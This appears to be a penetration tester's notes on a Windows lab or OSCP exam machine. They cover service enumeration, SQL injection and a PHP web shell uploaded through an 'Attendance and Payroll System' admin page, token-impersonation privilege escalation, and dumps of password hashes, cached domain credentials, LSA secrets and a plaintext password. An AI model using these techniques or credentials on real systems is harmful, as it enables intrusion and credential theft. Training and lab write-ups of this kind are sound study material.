@@ -1,0 +1,86 @@
+### ++ Approach ++
+#### Credentials
+	* Neovic Devierte nurhodelta:password
+
+#### Services
+    ##### 22 SSH
+		-
+
+    ##### 80 Http
+		-
+
+    ##### 81 Http
+		Admin panel at: /admin (Sqli vulnerable but I cannot get through. I found this exploit later: https://www.exploit-db.com/exploits/50802)
+        In /db we found nurhodelta hash (Cracked: 'password')
+
+    ##### 139,445 SMB
+		No null session
+
+    ##### 139,49664-70,50763 RPC
+		No null session
+
+    ##### 3306 MySQL
+		Unauthorized from our ip:
+            mysql -u nurhodelta -p'password' -h 192.168.224.141 -P 3306 apsystem
+
+
+    ##### 3307 MariaDB (internal)
+		-
+
+    ##### 5040 RDP?
+		-
+
+    ##### 5985,47001 WinRM
+		-
+
+### ++ Vulnerabilities ++
+
+#### Vuln 1: Webapp Attendance and Payroll System v1.0 is exploitable by SQLi ++
+	* Exploit: https://www.exploit-db.com/exploits/50802
+
+#### Vuln 2: Webapp Attendance and Payroll System v1.0 RCE by uploading a php payload ++
+	* Idea based on this exploit https://www.exploit-db.com/exploits/50801 (it doesn't work properly without modification) 
+	* We access to /admin/employee.php and upload a php shell as employee image. Then access it through /images/p0wny.php
+
+### ++ System Interaction ++
+#### Foothold  
+	* Accessing to port 81 webapp with vuln 1 and getting RCE through vuln 2
+
+#### Privilege Escalation 
+	* Abuse SeImpersonatePrivilege
+	
+#### Post-exploitation 
+	* Lazagne:
+		[+] Shahash found !!!
+		Shahash: 8cb61017910862af238631bf7aaae38df64998cd
+		Nthash: e728ecbadfb02f51ce8eed753f3ff3fd
+		Login: celia.almeda
+
+		[+] Shahash found !!!
+		Shahash: 4b1beca6645e6c3edb991248bcd992ec2a90fbb5
+		Nthash: 9a3121977ee93af56ebd0ef4f527a35e
+		Login: Mary.Williams
+
+		[+] Shahash found !!!
+		Shahash: 4d615b523fe14e41d37e3fb47f280f5168874c1a
+		Nthash: 4a2333a738981569a6d25c7b60906502
+		Login: MS01$
+	* Dumping with cme:
+		[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+		Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+		Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+		Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+		support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+		dave2:1004:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
+		[*] Dumping cached domain logon information (domain/username:hash)
+		OSCP.EXAM/celia.almeda:$DCC2$10240#celia.almeda#cdfd82ed5ad093e2774bb0cb51805515: (2023-03-02 09:26:01)
+		OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42)
+		OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-11-14 08:58:38)
+		[*] Dumping LSA Secrets
+		[*] $MACHINE.ACC 
+		$MACHINE.ACC:plain_password_hex:96fa6763edab7b38b231b3ba0f0ad6b41805c6faa024f5a658bf980768fc567676147ae5cfa2503ea54de5eb6640c6b91831d5a88ea9ca06c94bebadb96d101c283b80b1a444dcb743fda3e883d54699e3d6510d4be3488b89b9f32fdeb4fb08e418e110dbcbe849d6eaf646e7f2189e37a36f77741618a56b1f27aad254c400fcc9406824d2dd0e205c4c1204a9a727f325367d2ba1963003727a0ed579e794fa772d0c10982e2651cb16893c15c2dc27f94d123267844394d188f6106d1b72e494967832089ed76d4c2f64629faba0d7921531eef72e4d13859a06d799c5212ce8c42ed96ca5d1641d3a260f44e0ad
+		$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:223d71ec2fc3c37f629474f56221b682
+		[*] DefaultPassword 
+		(Unknown User):7k8XHk3dMtmpnC7
